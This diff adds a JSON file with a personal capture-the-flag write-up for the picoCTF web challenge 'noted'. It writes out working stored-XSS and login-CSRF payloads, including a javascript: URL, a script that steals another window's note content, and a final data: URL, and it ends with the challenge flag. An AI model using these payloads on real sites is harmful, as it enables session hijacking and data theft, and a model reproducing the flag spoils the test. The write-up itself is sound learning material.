@@ -1,0 +1,711 @@
+{
+  "boxes": [
+    {
+      "title": "noted",
+      "difficulty": "hard",
+      "order": 53,
+      "content": {
+        "nodes": [
+          {
+            "text": "jumping right into this one - for what it's worth, i've heard this one's actually HARD. am i cooked?"
+          },
+          {
+            "text": "description: \"I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right? Note that the headless browser used for the \"report\" feature does NOT have access to the internet.\"",
+            "subNodes": [
+              {
+                "text": "headless browser with no internet access? so it's just like more embedded html?"
+              },
+              {
+                "text": "OH SHIII it's like a note taking app right, which means user input, and then theres this stuff about embeds. this is definitely an injection box of some sort"
+              }
+            ]
+          },
+          {
+            "text": "woahh we get source code this time. that's either really good or i'm kinda screwed"
+          },
+          {
+            "text": "gobuster scan found:",
+            "subNodes": [
+              {
+                "text": "endpoint /new (HTTP 302)"
+              },
+              {
+                "text": "endpoint /notes (HTTP 302)"
+              },
+              {
+                "text": "endpoint /report (HTTP 302)"
+              },
+              {
+                "text": "endpoint /register (HTTP 200)"
+              }
+            ]
+          },
+          {
+            "text": "let's take a look at this source code real quick:",
+            "subNodes": [
+              {
+                "text": "god dammit there's a lot of code here"
+              },
+              {
+                "text": "looking at the dockerfile here, what the hell is libxss1?",
+                "subNodes": [
+                  {
+                    "text": "oh it's X screen saver lmao"
+                  }
+                ]
+              },
+              {
+                "text": "looking at our package.json it appears our dependencies are:",
+                "subNodes": [
+                  {
+                    "text": "\"argon2\": \"^0.28.3\","
+                  },
+                  {
+                    "text": "\"ejs\": \"^3.1.6\","
+                  },
+                  {
+                    "text": "\"fastify\": \"^3.25.3\","
+                  },
+                  {
+                    "text": "\"fastify-csrf\": \"^3.1.0\","
+                  },
+                  {
+                    "text": "\"fastify-formbody\": \"^5.2.0\","
+                  },
+                  {
+                    "text": "\"fastify-secure-session\": \"^3.0.0\","
+                  },
+                  {
+                    "text": "\"point-of-view\": \"^5.0.0\","
+                  },
+                  {
+                    "text": "\"puppeteer\": \"^13.0.1\","
+                  },
+                  {
+                    "text": "\"sequelize\": \"^6.12.5\","
+                  },
+                  {
+                    "text": "\"sqlite3\": \"^5.0.2\""
+                  }
+                ]
+              },
+              {
+                "text": "sqlite3 is good to know, possible that this is a SQLi thing"
+              },
+              {
+                "text": "damn, argon2 means passwords are prob hashed this time."
+              },
+              {
+                "text": "fastify csrf - there has to be some sorta vuln with this version right"
+              },
+              {
+                "text": "oh, puppeteer, that's the headless browser it's talking about. good to know",
+                "subNodes": [
+                  {
+                    "text": "if you don't know what puppeteer is btw, don't worry, i didn't either. it seems to be a NodeJS module that allows your scripts to make a headless chromium instance and programatically control it. basically it's google chrome but you can script it"
+                  }
+                ]
+              },
+              {
+                "text": "ok, let's dig into web.js now, seems to be this app's main file",
+                "subNodes": [
+                  {
+                    "text": "spent a bunch of time looking through models.js since it's required right at the top of web.js - it's literally just creating the sqlite schema. first half hour of this challenge is already up. damn"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "text": "ok, i've just spent a solid 10 more minutes looking through this web.js file. i've learned a couple things:",
+            "subNodes": [
+              {
+                "text": "first thing - looking through this code, i realize i actually really like fastify lol, i might learn this framework. idk, i guess i just vibe with it"
+              },
+              {
+                "text": "second thing - i think i've figured out (or rather CONFIRMED) our attack vector. it's the report feature",
+                "subNodes": [
+                  {
+                    "text": "report is where the puppeteer action comes in. basically, the user POSTs a url to /report, and if a puppeteer instance isn't already running, the following happens:"
+                  },
+                  {
+                    "text": "it visits the notes site at http://0.0.0.0:8080/register"
+                  },
+                  {
+                    "text": "it creates a new user with crypto.randomBytes(8) for the username and password, so that we have no idea whose it is"
+                  },
+                  {
+                    "text": "once the user is created, it creates a new note titled \"flag\", and it puts the flag (process.env.FLAG) inside it"
+                  },
+                  {
+                    "text": "it then opens up about:blank, and then visits the user's inputted url"
+                  },
+                  {
+                    "text": "after 7.5 seconds it closes the browser and we can try again"
+                  }
+                ]
+              },
+              {
+                "text": "given the hint in the description that this browser DOESNT have access to the internet, i bet our inputted URL is gonna have to be some permutation of 0.0.0.0:8080 - i guess we gotta find a way to get that"
+              },
+              {
+                "text": "given that the puppeteer is just going to about:blank and then our URL, rather than clearing cookies or localstorage or sessionstorage or anything, our fastify session probably still exists. if we visit 0.0.0.0:8080 again then we'll still be logged in. that seems pretty important. so basically we figure out how to give it a URL thatll make it expose the flag somehow"
+              },
+              {
+                "text": "OOH \"javascript:\" protocol exists for URL's just like \"http:\", \"https:\", \"data:\", \"file:\". i hope to GOD that's not blocked lol"
+              },
+              {
+                "text": "maybe we can have it fetch the note, store the flag content as a variable, log into our account, and then have it re-POST that flag content into a new note on our account? well, ONLY IF javascript urls arent blocked"
+              },
+              {
+                "text": "we're an hour in now"
+              }
+            ]
+          },
+          {
+            "text": "let's create an account on the site, haven't done that yet",
+            "subNodes": [
+              {
+                "text": "ok, username and pwd both \"e\" to make the final payload a little smaller"
+              },
+              {
+                "text": "let's first figure out how tf i'm meant to fetch the note with JS in the first place",
+                "subNodes": [
+                  {
+                    "text": "oh, cool! when i create a note, going to /notes i can just see the note title and note content right there. since the puppeteer will only be creating one single note (the flag), i can just grab the flag with document.querySelector(\"p\").innerText"
+                  },
+                  {
+                    "text": "wait how am i gonna do that if it's just the raw html being fetched lmao"
+                  }
+                ]
+              },
+              {
+                "text": "WAIT am i even allowed to fetch that endpoint, can't CORS get in the way or smth?",
+                "subNodes": [
+                  {
+                    "text": "let's try visiting about:blank in my browser on the noted tab"
+                  },
+                  {
+                    "text": "ok, let's try this with js url real quick",
+                    "subNodes": [
+                      {
+                        "text": "javascript:(()=>{fetch(\"http://saturn.picoctf.net:53645/notes\").then(r=>r.text()).then(t=>alert(t));})();"
+                      }
+                    ]
+                  },
+                  {
+                    "text": "Access to fetch at 'http://saturn.picoctf.net:53645/notes' from origin 'null' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource."
+                  },
+                  {
+                    "text": "huh. shit."
+                  },
+                  {
+                    "text": "what if i just add location.origin = \"http://saturn.picoctf.net:53645\" before the fetch?",
+                    "subNodes": [
+                      {
+                        "text": "ok yeah it doesnt work lmao, figured"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "text": "ok, there's probably some sort of intended bug that we're meant to be exploiting here. back to the code I go",
+            "subNodes": [
+              {
+                "text": "well damn, i dont really know what i'm looking for. havent found much"
+              },
+              {
+                "text": "OH WAIT A SEC, in notes.ejs the content is rendered as <%- note.title %>, <%- note.content %>. it's <%-, not <%=. it's unescaped, so that means we can do some XSS here. how though?"
+              },
+              {
+                "text": "2 hours in. i still dont know how that actually helps us"
+              }
+            ]
+          },
+          {
+            "text": "what's our hint?",
+            "subNodes": [
+              {
+                "text": "Hint 1: \"Are you sure I followed all the best practices?\"",
+                "subNodes": [
+                  {
+                    "text": "WELL NO SHIT YOU DIDNT"
+                  },
+                  {
+                    "text": "useless hint"
+                  }
+                ]
+              },
+              {
+                "text": "Hint 2: \"There's more than just HTTP(S)!\"",
+                "subNodes": [
+                  {
+                    "text": "OH COOL I WAS ONTO SOMETHING!"
+                  },
+                  {
+                    "text": "so it's prob gonna be something to do with javascript or like file or data URLs or something like that"
+                  }
+                ]
+              },
+              {
+                "text": "Hint 3: \"Things that require user interaction normally in Chrome might not require it in Headless Chrome.\"",
+                "subNodes": [
+                  {
+                    "text": "huh. cool? i think?"
+                  },
+                  {
+                    "text": "ok wtf is this actually talking about right now dawg 😭"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "text": "alrighty, 2.5 hours now. asked claude and it's dropping some elite knowledge here:",
+            "subNodes": [
+              {
+                "text": "first of all, in web.js, the login page doesnt have CSRF protection. that's pretty huge - i can plant XSS in my own notes, and now that i dont need a token to log in, i can prob just POST /login with my credentials which will redirect me to /notes"
+              },
+              {
+                "text": "if i get to /notes then my XSS will execute! but then what the hell do i do with that?"
+              },
+              {
+                "text": "well, the problem with fetching /notes earlier was that we needed to request from the same origin in order to pass CORS policy. but now if my XSS is on the noted website itself, it's inherently the same origin and thus it can also fetch /new to create new posts, which is something i couldn't do earlier"
+              },
+              {
+                "text": "ok, cool. so once again, what the hell do i do with that? great, i can make new notes on my own account! i could always do that though!"
+              },
+              {
+                "text": "this is where claude absolutely clutched - apparently theres a couple tricks I can use with window.open",
+                "subNodes": [
+                  {
+                    "text": "didn't know this but when you call window.open, it returns a reference to that window which you can store in a variable"
+                  },
+                  {
+                    "text": "yknow how we do document.querySelector, or like addEventListener(\"onload\", ...)? well of course that's calling window.document.querySelector, and window.addEventListener. that window object at the front can be any window object though"
+                  },
+                  {
+                    "text": "if i do sth like var win = window.open(\"0.0.0.0:8080/notes\"); as long as i'm still same-site i can pull a casual win1.document.querySelector(\"...\"); because win1 is also a window object."
+                  },
+                  {
+                    "text": "ok, but still, how does that help us? how does the XSS get access to the window that my JS URL is storing a reference to? apparently there's a way."
+                  },
+                  {
+                    "text": "there's a lot more parameters in window.open (didn't know that either lol). one of those params is target - basically when you do a window.open call, you can name that specific call",
+                    "subNodes": [
+                      {
+                        "text": "e.g., I can do window.open(\"0.0.0.0:8080\", \"win1\"); this new window is now called win1 in the browser memory"
+                      },
+                      {
+                        "text": "notice how i didnt store that as a variable. that's fine, because i can get a reference to that window with something like var win = window.open(\"\", \"win1\");"
+                      },
+                      {
+                        "text": "even though we're not changing the location of that specific window object, the window.open call to that specific named target will still return a reference to that target. THIS IS THE SOLUTION."
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "text": "i think i know what to do from here now",
+            "subNodes": [
+              {
+                "text": "create a new note with some XSS:",
+                "subNodes": [
+                  {
+                    "text": "pull a reference to the named window \"bot\"; this is the bot's \"/notes\" window"
+                  },
+                  {
+                    "text": "pull the flag the bot DOM and store it as a variable"
+                  },
+                  {
+                    "text": "GET /new and extract the CSRF token; this should work since origin is the same"
+                  },
+                  {
+                    "text": "using that CSRF token, POST /new to create a new note which contains the flag"
+                  }
+                ]
+              },
+              {
+                "text": "report a JS url that does the following:",
+                "subNodes": [
+                  {
+                    "text": "immediately open a named window \"bot\" with URL 0.0.0.0:8080/notes - this should work even without samesite"
+                  },
+                  {
+                    "text": "once the \"bot\" window loads, POST to /login with my known credentials since no CSRF token needed; the session cookie gets updated"
+                  },
+                  {
+                    "text": "open another new window going to /notes; now we're in MY notes and my XSS runs"
+                  }
+                ]
+              },
+              {
+                "text": "so the flag should just be in my notes now - i can just log in and grab it and we're done!"
+              }
+            ]
+          },
+          {
+            "text": "at least, that's the idea. we're now 3.3 hours in - let's do this",
+            "subNodes": [
+              {
+                "text": "first and foremost, how do i actually do xss within a note?",
+                "subNodes": [
+                  {
+                    "text": "let's try title as hi<script>alert(\"xss\")</script>"
+                  },
+                  {
+                    "text": "wait wtf, the page just hangs. why?"
+                  },
+                  {
+                    "text": "maybe it's just the alert? let's try console.log(\"xss\") instead - maybe that does sth",
+                    "subNodes": [
+                      {
+                        "text": "OK that one worked - not sure why this and not alert"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "text": "ok, success!"
+              },
+              {
+                "text": "my report URL:"
+              },
+              {
+                "text": "javascript:(()=>{"
+              },
+              {
+                "text": "    window.open(\"http://0.0.0.0:8080/notes\", \"bot\").onload = () => {"
+              },
+              {
+                "text": "        fetch(\"http://0.0.0.0:8080/login\", {"
+              },
+              {
+                "text": "            method: \"POST\","
+              },
+              {
+                "text": "            headers: { \"Content-Type\":\"application/x-www-form-urlencoded\" },"
+              },
+              {
+                "text": "            body: \"username=e&password=e\""
+              },
+              {
+                "text": "        }).then(r=>window.location = \"http://0.0.0.0:8080/notes\");"
+              },
+              {
+                "text": "    }"
+              },
+              {
+                "text": "})();"
+              },
+              {
+                "text": "my xss payload:"
+              },
+              {
+                "text": "<script>"
+              },
+              {
+                "text": "    let flag = window.open(\"\",\"bot\").document.querySelector(\"p\").innerText;"
+              },
+              {
+                "text": ""
+              },
+              {
+                "text": "    fetch(\"/new\").then(r=>r.text()).then(t=>{"
+              },
+              {
+                "text": "        let pattern = 'name=\"_csrf\" value=\"';"
+              },
+              {
+                "text": "        let i1 = t.indexOf(pattern) + pattern.length;"
+              },
+              {
+                "text": "        let i2 = t.indexOf('\"', i1);"
+              },
+              {
+                "text": "        return t.substring(i1, i2);"
+              },
+              {
+                "text": "    }).then(csrf => {"
+              },
+              {
+                "text": "        fetch(\"/new\", {"
+              },
+              {
+                "text": "            method: \"POST\","
+              },
+              {
+                "text": "            headers: { \"Content-Type\":\"application/x-www-form-urlencoded\" },"
+              },
+              {
+                "text": "            body: `_csrf=${encodeURIComponent(csrf)}&title=${Math.floor(Math.random()*1000)}&content=${encodeURIComponent(flag)}`"
+              },
+              {
+                "text": "        });"
+              },
+              {
+                "text": "    });"
+              },
+              {
+                "text": "</script>"
+              },
+              {
+                "text": "i think this should work - let's go."
+              },
+              {
+                "text": "creating a note with my xss payload..."
+              },
+              {
+                "text": "flattening the js url into one line..."
+              },
+              {
+                "text": "4 hours in now. reporting - moment of truth..."
+              },
+              {
+                "text": "god dammit. nothing. how do i even debug this?"
+              }
+            ]
+          },
+          {
+            "text": "ok, let's go one by one:",
+            "subNodes": [
+              {
+                "text": "let's confirm that the XSS is actually able to make new notes",
+                "subNodes": [
+                  {
+                    "text": "yeah, that works - each time i reload the page, another note with hardcoded contents appears"
+                  }
+                ]
+              },
+              {
+                "text": "ok, so now let's make sure that this xss payload can actually read the DOM of a \"bot\" window",
+                "subNodes": [
+                  {
+                    "text": "opened a bot window with window.open(window.location, \"bot\")"
+                  },
+                  {
+                    "text": "set the flag equal to the innerText of the \"My Notes\" heading at the top of this page; rest of script is the same"
+                  },
+                  {
+                    "text": "oh, shit, yeah, it IS posting \"My Notes\" over and over into new notes."
+                  }
+                ]
+              },
+              {
+                "text": "let's simulate the attack manually then - if i create a new user, create a new note with a 'flag' in it, THEN open a bot window, log out (clear session ID) and log in as me, can my XSS still get the flag from the bot dom?",
+                "subNodes": [
+                  {
+                    "text": "oh, yep. works immaculately - so what's the problem then?"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "text": "ok, now i'm gonna do everything exactly how the puppeteer would do it, except im gonna run my js url in about:blank javascript console line by line - let's see where the problem is",
+            "subNodes": [
+              {
+                "text": "ok, i've created the xss as user \"e\", created the flag as user \"ajsekfahskasdj\" (at least it was SOMETHING like that)"
+              },
+              {
+                "text": "in about:blank now and i think i got it - i cant create a window.onload for the bot window from about:blank because we're not on the same origin anymore. what if instead of w.onload i just have a setTimeout(theRestOfTheFunction, 3000) or something like that? 3 seconds should be plenty to load the bot window right?"
+              },
+              {
+                "text": "ok, that WORKED, but i still can't post to /login because of CORS. there's the problem. so i gotta somehow log in from same origin without leaving about:blank (because that would cancel my javascript url execution).",
+                "subNodes": [
+                  {
+                    "text": "hol up, what if i use a data url instead of a javascript url, we have an iframe pointing to the login page in it, and we have a <script> that goes into the iframe, fills out the form and logs in? then the iframe itself will be redirected to /notes and my xss will run. might be worth a shot"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "text": "OH SHI WAIT A SECOND",
+            "subNodes": [
+              {
+                "text": "asked claude because the whole iframe thing seemed way too complicated for this kinda challenge + pretty sure i cant script into the frame without running into cross-origin problems anyway"
+              },
+              {
+                "text": "claude says that forms don't give a damn about CORS even when the form action is cross-origin? tf? that's perfect though, i can just make a form in js, make hidden inputs and then submit it all with js and that should just *work*."
+              },
+              {
+                "text": "it's pretty much hour 5 now, gonna go eat lunch before i try this"
+              }
+            ]
+          },
+          {
+            "text": "ok, I'm back. new payloads:",
+            "subNodes": [
+              {
+                "text": "javascript:(()=>{"
+              },
+              {
+                "text": "    let w = window.open(\"http://0.0.0.0:8080/notes\", \"bot\");"
+              },
+              {
+                "text": "    setTimeout(() => {"
+              },
+              {
+                "text": "        const f = document.createElement(\"form\");"
+              },
+              {
+                "text": "        f.setAttribute(\"method\", \"POST\"); f.setAttribute(\"action\", \"http://0.0.0.0:8080/login\");"
+              },
+              {
+                "text": ""
+              },
+              {
+                "text": "        const u = document.createElement(\"input\");"
+              },
+              {
+                "text": "        u.setAttribute(\"type\", \"hidden\");"
+              },
+              {
+                "text": "        u.setAttribute(\"name\", \"username\");"
+              },
+              {
+                "text": "        u.setAttribute(\"value\", \"e\");"
+              },
+              {
+                "text": ""
+              },
+              {
+                "text": "        const p = document.createElement(\"input\");"
+              },
+              {
+                "text": "        p.setAttribute(\"type\", \"hidden\");"
+              },
+              {
+                "text": "        p.setAttribute(\"name\", \"password\");"
+              },
+              {
+                "text": "        p.setAttribute(\"value\", \"e\");"
+              },
+              {
+                "text": ""
+              },
+              {
+                "text": "        f.appendChild(u); f.appendChild(p); document.body.appendChild(f);"
+              },
+              {
+                "text": ""
+              },
+              {
+                "text": "        f.submit();"
+              },
+              {
+                "text": "    }, 5000);"
+              },
+              {
+                "text": "})();"
+              },
+              {
+                "text": "<script>"
+              },
+              {
+                "text": "    let flag = window.open(\"\", \"bot\").document.querySelector(\"p\").innerText;"
+              },
+              {
+                "text": "    console.log(flag);"
+              },
+              {
+                "text": ""
+              },
+              {
+                "text": "    fetch(\"/new\").then(r=>r.text()).then(t=>{"
+              },
+              {
+                "text": "        let pattern = 'name=\"_csrf\" value=\"';"
+              },
+              {
+                "text": "        let i1 = t.indexOf(pattern) + pattern.length;"
+              },
+              {
+                "text": "        let i2 = t.indexOf('\"', i1);"
+              },
+              {
+                "text": "        return t.substring(i1, i2);"
+              },
+              {
+                "text": "    }).then(csrf => {"
+              },
+              {
+                "text": "        fetch(\"/new\", {"
+              },
+              {
+                "text": "            method: \"POST\","
+              },
+              {
+                "text": "            headers: { \"Content-Type\":\"application/x-www-form-urlencoded\" },"
+              },
+              {
+                "text": "            body: `_csrf=${encodeURIComponent(csrf)}&title=${Math.floor(Math.random()*1000)}&content=${flag}`"
+              },
+              {
+                "text": "        });"
+              },
+              {
+                "text": "    });"
+              },
+              {
+                "text": "</script>"
+              },
+              {
+                "text": "OK, so it seems that these payloads work perfectly when I'm simulating it all manually - just not when it's url reporting for some reason?",
+                "subNodes": [
+                  {
+                    "text": "wait does puppeteer even support javascript urls though?",
+                    "subNodes": [
+                      {
+                        "text": "FUUUUUUUUUUU"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "text": "that makes sense now. puppeteer in the goto method doesn't like javascript pseudo-urls. it DOES support data urls though, so we can make an html data url that already has the form pre-built and that has a <script> which submits it;"
+              },
+              {
+                "text": "so our reported url is now:"
+              },
+              {
+                "text": "data:text/html,<body><form method=\"POST\" action=\"http://0.0.0.0:8080/login\"><input type=\"hidden\" value=\"e\" name=\"username\" /><input type=\"hidden\" value=\"e\" name=\"password\" /></form><script>document.querySelector(\"form\").submit()</script></body>"
+              },
+              {
+                "text": "nevermind i forgot the actual \"open a bot window\" part lol"
+              }
+            ]
+          },
+          {
+            "text": "final payload. if this one doesnt work i'm looking up a walkthrough, theres no way"
+          },
+          {
+            "text": "data:text/html,<body><form method=\"POST\" action=\"http://0.0.0.0:8080/login\"><input type=\"hidden\" value=\"e\" name=\"username\" /><input type=\"hidden\" value=\"e\" name=\"password\" /></form><script>window.open(\"http://0.0.0.0:8080/notes\", \"bot\"); setTimeout(() => document.querySelector(\"form\").submit(), 5000)</script></body>"
+          },
+          {
+            "text": "HELL YEAH THERE WE GO"
+          },
+          {
+            "text": "that shit was PAINFUL, genuinely my longest writeup ever."
+          },
+          {
+            "text": "final time is like ~6 hours (idk for sure, it's been so long i lost track)"
+          }
+        ],
+        "reflections": [
+          "of all the boxes i've done, this has easily been the most complex. i freaking LOVE how this one works, really awesome solution. out of all of them, I felt the most like a real \"hacker\" in this one. craziest part is that this is probably still like INTERMEDIATE stuff, not even actually advanced yet. i've got a LONG way to go but it's starting to make sense"
+        ]
+      },
+      "flag": "picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}"
+    }
+  ]
+}
